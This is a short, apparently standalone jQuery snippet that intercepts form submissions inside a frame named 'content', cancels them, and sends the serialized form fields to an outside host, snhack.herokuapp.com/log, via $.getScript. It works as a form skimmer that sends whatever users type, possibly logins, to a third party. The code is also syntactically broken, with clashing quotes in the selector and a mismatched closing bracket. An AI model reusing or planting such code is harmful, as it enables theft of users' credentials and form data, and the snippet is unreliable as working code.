$('frame[name='content']').load(function(){
  $("form", this).submit(function(e){
      e.preventDefault();
      $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
  });
};
